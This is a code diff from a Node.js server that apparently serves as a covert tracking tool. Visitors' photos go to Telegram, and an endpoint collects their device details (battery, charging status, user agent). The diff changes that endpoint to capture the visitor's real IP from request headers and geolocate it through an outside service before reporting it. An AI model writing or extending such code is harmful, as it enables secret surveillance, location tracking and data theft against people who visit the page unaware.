@@ -73,31 +73,33 @@ async function sendPhotoToTelegram(dataURL, userAgent) {
     }
 }
 
-// Get public IP and geolocation
-app.get('/ip', async (req, res) => {
+// Get geolocation based on client IP
+async function getGeolocation(ip) {
     try {
-        const ipResponse = await axios.get('https://api.ipify.org?format=json');
-        const ip = ipResponse.data.ip;
-
         const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
-        const geolocation = geoResponse.data;
-
-        res.json({ ip, geolocation });
+        return geoResponse.data;
     } catch (error) {
-        console.error('Error fetching IP and geolocation:', error);
-        res.status(500).send('Error fetching IP and geolocation');
+        console.error('Error fetching geolocation:', error);
+        return null;
     }
-});
+}
 
 // Receive device information
 app.post('/device-info', async (req, res) => {
     const deviceInfo = req.body;
     console.log('Device Info:', deviceInfo);
 
+    // Get client IP from request headers
+    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    console.log('Client IP:', clientIp);
+
+    // Get geolocation based on client IP
+    const geolocation = await getGeolocation(clientIp);
+
     const message = `
 Device Information:
-- IP: ${deviceInfo.ip}
-- Geolocation: ${deviceInfo.geolocation.city}, ${deviceInfo.geolocation.country}
+- IP: ${clientIp}
+- Geolocation: ${geolocation ? `${geolocation.city}, ${geolocation.country}` : 'Unable to determine'}
 - Battery Percentage: ${deviceInfo.batteryPercentage}%
 - Charging Status: ${deviceInfo.chargingStatus}
 - User Agent: ${deviceInfo.userAgent}
